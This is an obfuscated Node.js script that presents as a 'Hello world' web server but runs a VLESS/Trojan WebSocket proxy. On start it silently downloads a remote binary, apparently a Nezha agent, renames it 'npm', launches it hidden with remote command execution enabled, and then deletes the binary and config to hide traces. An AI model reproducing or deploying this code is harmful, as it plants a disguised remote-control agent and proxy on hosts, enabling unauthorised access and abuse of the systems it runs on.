const _0x2610=['get','end','crypto','length','readFile','Server','unlink','Hello\x20world!','error:\x20','reduce','true','toString','digest','https://dns.google/resolve?name=','createHash','https://api.ip.sb/geoip','replace',':443?security=tls&sni=','NAME','sha224','utf-8','&fp=chrome&type=ws&host=','type','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','join','https://arm64.ssss.nyc.mn/v1','arm64','message','npm\x20is\x20already\x20running,\x20skip\x20running...','catch','&path=%2F','2053','readUInt8','\x20-p\x20','child_process','Unknown','vless://','chmod\x20+x\x20npm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','utf8','axios','text/html','config.yaml','2087','client_secret:\x20','2096','&type=A','then','data','arch','readUInt16BE','update','2e5809f8-50a9-41d9-8e8a-925f5716de6c','application/dns-json','2083','443','npm','error','Failed\x20to\x20resolve\x20','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_KEY','base64','writeFileSync','https://oooo.serv00.net/add-url','http','substr','aarch64','--tls','Answer','close','includes','slice','log','decode','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','env','map','pipe','concat','8.8.4.4','connection'];const _0x48ec=function(_0x261065,_0x48ec4c){_0x261065=_0x261065-0x0;let _0x169943=_0x2610[_0x261065];return _0x169943;};const os=require('os');const http=require(_0x48ec('0x41'));const fs=require('fs');const axios=require(_0x48ec('0x29'));const net=require('net');const path=require('path');const crypto=require(_0x48ec('0x2'));const {Buffer}=require('buffer');const {exec,execSync}=require(_0x48ec('0x22'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x48ec('0x4c')]['UUID']||_0x48ec('0x35');const NEZHA_SERVER=process[_0x48ec('0x4c')]['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x48ec('0x4c')][_0x48ec('0x27')]||'';const NEZHA_KEY=process['env'][_0x48ec('0x3d')]||'';const DOMAIN=process['env']['DOMAIN']||'1234.abc.com';const AUTO_ACCESS=process[_0x48ec('0x4c')]['AUTO_ACCESS']||!![];const WSPATH=process['env']['WSPATH']||UUID[_0x48ec('0x48')](0x0,0x8);const SUB_PATH=process[_0x48ec('0x4c')]['SUB_PATH']||'sub';const NAME=process[_0x48ec('0x4c')][_0x48ec('0x12')]||'';const PORT=process[_0x48ec('0x4c')]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x4e1939=await axios['get'](_0x48ec('0xf'));const _0x4151b7=_0x4e1939['data'];ISP=(_0x4151b7['country_code']+'-'+_0x4151b7['isp'])['replace'](/ /g,'_');}catch(_0x3cef81){ISP=_0x48ec('0x23');}};GetISP();const httpServer=http['createServer']((_0x265432,_0x3eeddc)=>{if(_0x265432['url']==='/'){const _0x1c80ef=path['join'](__dirname,'index.html');fs[_0x48ec('0x4')](_0x1c80ef,_0x48ec('0x28'),(_0x37237c,_0x347621)=>{if(_0x37237c){_0x3eeddc['writeHead'](0xc8,{'Content-Type':'text/html'});_0x3eeddc['end'](_0x48ec('0x7'));return;}_0x3eeddc['writeHead'](0xc8,{'Content-Type':_0x48ec('0x2a')});_0x3eeddc['end'](_0x347621);});return;}else if(_0x265432['url']==='/'+SUB_PATH){const _0x1a127b=NAME?NAME+'-'+ISP:ISP;const _0x31f85e=_0x48ec('0x24')+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x48ec('0x1e')+WSPATH+'#'+_0x1a127b;const _0x4c31c9='trojan://'+UUID+'@'+DOMAIN+_0x48ec('0x11')+DOMAIN+_0x48ec('0x15')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x1a127b;const _0x9c0a87=_0x31f85e+'\x0a'+_0x4c31c9;const _0x3012fe=Buffer['from'](_0x9c0a87)['toString'](_0x48ec('0x3e'));_0x3eeddc['writeHead'](0xc8,{'Content-Type':'text/plain'});_0x3eeddc[_0x48ec('0x1')](_0x3012fe+'\x0a');}else{_0x3eeddc['writeHead'](0x194,{'Content-Type':'text/plain'});_0x3eeddc[_0x48ec('0x1')]('Not\x20Found\x0a');}});const wss=new WebSocket[(_0x48ec('0x5'))]({'server':httpServer});const uuid=UUID[_0x48ec('0x10')](/-/g,'');const DNS_SERVERS=[_0x48ec('0x50'),'1.1.1.1'];function resolveHost(_0x19340d){return new Promise((_0x185658,_0x1e7eb1)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x19340d)){_0x185658(_0x19340d);return;}let _0x6495e6=0x0;function _0x3d33d9(){if(_0x6495e6>=DNS_SERVERS['length']){_0x1e7eb1(new Error(_0x48ec('0x3b')+_0x19340d+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xa7fd51=DNS_SERVERS[_0x6495e6];_0x6495e6++;const _0xcf50f0=_0x48ec('0xd')+encodeURIComponent(_0x19340d)+_0x48ec('0x2f');axios[_0x48ec('0x0')](_0xcf50f0,{'timeout':0x1388,'headers':{'Accept':_0x48ec('0x36')}})['then'](_0x177330=>{const _0x3aaea0=_0x177330['data'];if(_0x3aaea0['Status']===0x0&&_0x3aaea0['Answer']&&_0x3aaea0['Answer'][_0x48ec('0x3')]>0x0){const _0x29b274=_0x3aaea0[_0x48ec('0x45')]['find'](_0x53e5c0=>_0x53e5c0[_0x48ec('0x16')]===0x1);if(_0x29b274){_0x185658(_0x29b274[_0x48ec('0x31')]);return;}}_0x3d33d9();})['catch'](_0xe07b29=>{_0x3d33d9();});}_0x3d33d9();});}function handleVlessConnection(_0x54c756,_0x24fa9f){const [_0x213746]=_0x24fa9f;const _0x305302=_0x24fa9f[_0x48ec('0x48')](0x1,0x11);if(!_0x305302['every']((_0xcc4ae0,_0x4e1010)=>_0xcc4ae0==parseInt(uuid[_0x48ec('0x42')](_0x4e1010*0x2,0x2),0x10)))return![];let _0x8a4e8a=_0x24fa9f[_0x48ec('0x48')](0x11,0x12)[_0x48ec('0x20')]()+0x13;const _0x245bc7=_0x24fa9f['slice'](_0x8a4e8a,_0x8a4e8a+=0x2)[_0x48ec('0x33')](0x0);const _0x546ea0=_0x24fa9f['slice'](_0x8a4e8a,_0x8a4e8a+=0x1)[_0x48ec('0x20')]();const _0x5c5eda=_0x546ea0==0x1?_0x24fa9f[_0x48ec('0x48')](_0x8a4e8a,_0x8a4e8a+=0x4)['join']('.'):_0x546ea0==0x2?new TextDecoder()[_0x48ec('0x4a')](_0x24fa9f[_0x48ec('0x48')](_0x8a4e8a+0x1,_0x8a4e8a+=0x1+_0x24fa9f['slice'](_0x8a4e8a,_0x8a4e8a+0x1)['readUInt8']())):_0x546ea0==0x3?_0x24fa9f['slice'](_0x8a4e8a,_0x8a4e8a+=0x10)[_0x48ec('0x9')]((_0x3c36d7,_0x41048e,_0xdf5227,_0xc47437)=>_0xdf5227%0x2?_0x3c36d7['concat'](_0xc47437[_0x48ec('0x48')](_0xdf5227-0x1,_0xdf5227+0x1)):_0x3c36d7,[])['map'](_0x2fc84b=>_0x2fc84b['readUInt16BE'](0x0)['toString'](0x10))[_0x48ec('0x18')](':'):'';_0x54c756['send'](new Uint8Array([_0x213746,0x0]));const _0x495cea=createWebSocketStream(_0x54c756);resolveHost(_0x5c5eda)[_0x48ec('0x30')](_0x283fec=>{net['connect']({'host':_0x283fec,'port':_0x245bc7},function(){this['write'](_0x24fa9f['slice'](_0x8a4e8a));_0x495cea['on'](_0x48ec('0x3a'),()=>{})[_0x48ec('0x4e')](this)['on']('error',()=>{})[_0x48ec('0x4e')](_0x495cea);})['on']('error',()=>{});})['catch'](_0x1fdd73=>{net['connect']({'host':_0x5c5eda,'port':_0x245bc7},function(){this['write'](_0x24fa9f[_0x48ec('0x48')](_0x8a4e8a));_0x495cea['on']('error',()=>{})['pipe'](this)['on'](_0x48ec('0x3a'),()=>{})[_0x48ec('0x4e')](_0x495cea);})['on'](_0x48ec('0x3a'),()=>{});});return!![];}function handleTrojanConnection(_0x221ffd,_0x279032){try{if(_0x279032['length']<0x3a)return![];const _0x63a32d=_0x279032[_0x48ec('0x48')](0x0,0x38)[_0x48ec('0xb')]();const _0x22802b=[UUID];let _0x56dff7=null;for(const _0x16b73d of _0x22802b){const _0x56447e=crypto[_0x48ec('0xe')](_0x48ec('0x13'))[_0x48ec('0x34')](_0x16b73d)[_0x48ec('0xc')]('hex');if(_0x56447e===_0x63a32d){_0x56dff7=_0x16b73d;break;}}if(!_0x56dff7)return![];let _0x3a6b41=0x38;if(_0x279032[_0x3a6b41]===0xd&&_0x279032[_0x3a6b41+0x1]===0xa){_0x3a6b41+=0x2;}const _0x2821d2=_0x279032[_0x3a6b41];if(_0x2821d2!==0x1)return![];_0x3a6b41+=0x1;const _0x3e5fd8=_0x279032[_0x3a6b41];_0x3a6b41+=0x1;let _0x1be79f,_0x34cca5;if(_0x3e5fd8===0x1){_0x1be79f=_0x279032[_0x48ec('0x48')](_0x3a6b41,_0x3a6b41+0x4)['join']('.');_0x3a6b41+=0x4;}else if(_0x3e5fd8===0x3){const _0x22194f=_0x279032[_0x3a6b41];_0x3a6b41+=0x1;_0x1be79f=_0x279032['slice'](_0x3a6b41,_0x3a6b41+_0x22194f)['toString']();_0x3a6b41+=_0x22194f;}else if(_0x3e5fd8===0x4){_0x1be79f=_0x279032[_0x48ec('0x48')](_0x3a6b41,_0x3a6b41+0x10)[_0x48ec('0x9')]((_0x376462,_0x560325,_0x1383c1,_0x40d882)=>_0x1383c1%0x2?_0x376462[_0x48ec('0x4f')](_0x40d882[_0x48ec('0x48')](_0x1383c1-0x1,_0x1383c1+0x1)):_0x376462,[])[_0x48ec('0x4d')](_0x4ec39f=>_0x4ec39f['readUInt16BE'](0x0)['toString'](0x10))['join'](':');_0x3a6b41+=0x10;}else{return![];}_0x34cca5=_0x279032['readUInt16BE'](_0x3a6b41);_0x3a6b41+=0x2;if(_0x3a6b41<_0x279032['length']&&_0x279032[_0x3a6b41]===0xd&&_0x279032[_0x3a6b41+0x1]===0xa){_0x3a6b41+=0x2;}const _0x16b34f=createWebSocketStream(_0x221ffd);resolveHost(_0x1be79f)['then'](_0x37e502=>{net['connect']({'host':_0x37e502,'port':_0x34cca5},function(){if(_0x3a6b41<_0x279032['length']){this['write'](_0x279032['slice'](_0x3a6b41));}_0x16b34f['on'](_0x48ec('0x3a'),()=>{})[_0x48ec('0x4e')](this)['on']('error',()=>{})['pipe'](_0x16b34f);})['on']('error',()=>{});})[_0x48ec('0x1d')](_0x4c030c=>{net['connect']({'host':_0x1be79f,'port':_0x34cca5},function(){if(_0x3a6b41<_0x279032[_0x48ec('0x3')]){this['write'](_0x279032['slice'](_0x3a6b41));}_0x16b34f['on']('error',()=>{})['pipe'](this)['on'](_0x48ec('0x3a'),()=>{})['pipe'](_0x16b34f);})['on']('error',()=>{});});return!![];}catch(_0x5b9194){return![];}}wss['on'](_0x48ec('0x51'),(_0x5329b2,_0x46d8e6)=>{const _0x54d4dd=_0x46d8e6['url']||'';_0x5329b2['once'](_0x48ec('0x1b'),_0x4de6ad=>{if(_0x4de6ad['length']>0x11&&_0x4de6ad[0x0]===0x0){const _0x388a01=_0x4de6ad[_0x48ec('0x48')](0x1,0x11);const _0x535ef2=_0x388a01['every']((_0x2a08f6,_0x110412)=>_0x2a08f6==parseInt(uuid['substr'](_0x110412*0x2,0x2),0x10));if(_0x535ef2){if(!handleVlessConnection(_0x5329b2,_0x4de6ad)){_0x5329b2['close']();}return;}}if(!handleTrojanConnection(_0x5329b2,_0x4de6ad)){_0x5329b2[_0x48ec('0x46')]();}})['on'](_0x48ec('0x3a'),()=>{});});const getDownloadUrl=()=>{const _0x9ac506=os[_0x48ec('0x32')]();if(_0x9ac506==='arm'||_0x9ac506===_0x48ec('0x1a')||_0x9ac506===_0x48ec('0x43')){if(!NEZHA_PORT){return _0x48ec('0x19');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x119a4b=getDownloadUrl();const _0x57eb59=await axios({'method':_0x48ec('0x0'),'url':_0x119a4b,'responseType':'stream'});const _0x5f2a14=fs['createWriteStream'](_0x48ec('0x39'));_0x57eb59[_0x48ec('0x31')][_0x48ec('0x4e')](_0x5f2a14);return new Promise((_0x37e676,_0x1ad350)=>{_0x5f2a14['on']('finish',()=>{console[_0x48ec('0x49')]('npm\x20download\x20successfully');exec(_0x48ec('0x25'),_0x48fbb3=>{if(_0x48fbb3)_0x1ad350(_0x48fbb3);_0x37e676();});});_0x5f2a14['on'](_0x48ec('0x3a'),_0x1ad350);});}catch(_0x5a4ad7){throw _0x5a4ad7;}};const runnz=async()=>{try{const _0x2dbc95=execSync(_0x48ec('0x4b'),{'encoding':_0x48ec('0x14')});if(_0x2dbc95['trim']()!==''){console['log'](_0x48ec('0x1c'));return;}}catch(_0x3f2b67){}await downloadFile();let _0x224e96='';let _0x35bb8b=[_0x48ec('0x38'),'8443',_0x48ec('0x2e'),_0x48ec('0x2c'),_0x48ec('0x37'),_0x48ec('0x1f')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1b9601=_0x35bb8b['includes'](NEZHA_PORT)?_0x48ec('0x44'):'';_0x224e96='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x48ec('0x21')+NEZHA_KEY+'\x20'+_0x1b9601+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4baaf2=NEZHA_SERVER[_0x48ec('0x47')](':')?NEZHA_SERVER['split'](':')['pop']():'';const _0x555a62=_0x35bb8b['includes'](_0x4baaf2)?_0x48ec('0xa'):'false';const _0x4d9e68=_0x48ec('0x2d')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x555a62+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x48ec('0x3f')]('config.yaml',_0x4d9e68);}_0x224e96=_0x48ec('0x26');}else{console[_0x48ec('0x49')](_0x48ec('0x17'));return;}try{exec(_0x224e96,{'shell':'/bin/bash'},_0x486cf7=>{if(_0x486cf7)console[_0x48ec('0x3a')]('npm\x20running\x20error:',_0x486cf7);else console[_0x48ec('0x49')]('npm\x20is\x20running');});}catch(_0x489f11){console['error'](_0x48ec('0x8')+_0x489f11);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x2f9178='https://'+DOMAIN;try{const _0x535f62=await axios['post'](_0x48ec('0x40'),{'url':_0x2f9178},{'headers':{'Content-Type':'application/json'}});console[_0x48ec('0x49')](_0x48ec('0x3c'));}catch(_0x40d380){}}const delFiles=()=>{fs[_0x48ec('0x6')]('npm',()=>{});fs['unlink'](_0x48ec('0x2b'),()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
